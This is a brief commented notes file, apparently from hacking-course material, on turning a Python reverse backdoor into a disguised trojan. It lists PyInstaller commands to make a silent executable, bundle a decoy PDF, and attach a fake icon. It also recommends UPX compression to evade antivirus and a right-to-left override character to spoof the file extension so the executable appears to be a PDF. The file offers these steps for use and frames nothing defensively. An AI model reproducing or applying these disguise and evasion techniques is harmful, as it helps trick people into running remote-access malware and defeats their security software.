#  first install pyinstaller doing python -m pip install pynstaller in windows
# Syntax of using pyinstaller for packaging
# pyinstaller nameoffile.py --onefile
# Example: pyinstaller reverse_backdoor.py --onefile

# in order to .exe to run silently without displaying the black screen
# pyinstaller nameoffile.py --onefile --noconsole

# in order to package your exe as a pdf or jpeg file ie create a trojan file, run the following command
# pyinstaller --add-data "location_of_the_file;destination_folder_to_save_the_trojan" --onefile --noconsole nameoffile.py
# by default pynstaller will save it in the temp directory
# Example: pyinstaller --add-data "C:\Users\donsavinero\Desktop\sample.pdf;." --onefile --noconsole reverse_backdoor.py

# use upx to compress the executable files to bypass antivirus program

# in order to change the icon of the executable
# first find an icon for instance on iconfinder.com and download it
# convert it to a .ico extension sing for instance easyicon.net
#  pyinstaller --add-data "location_of_the_file;destination_folder_to_save_the_trojan" --onefile --noconsole --icon path_of_icon nameoffile.py
# Example: pyinstaller --add-data "C:\Users\donsavinero\Desktop\sample.pdf;." --onefile --noconsole --icon C:\Users\donsavinero\Desktop\sample.ico reverse_backdoor.py

# use right-to-left character in kali to spoof the file extension
# for example cedric-fdp.exe will write as cedric-exe.pdf
# make sure you save in archive to avoid browser to renaming to normal one
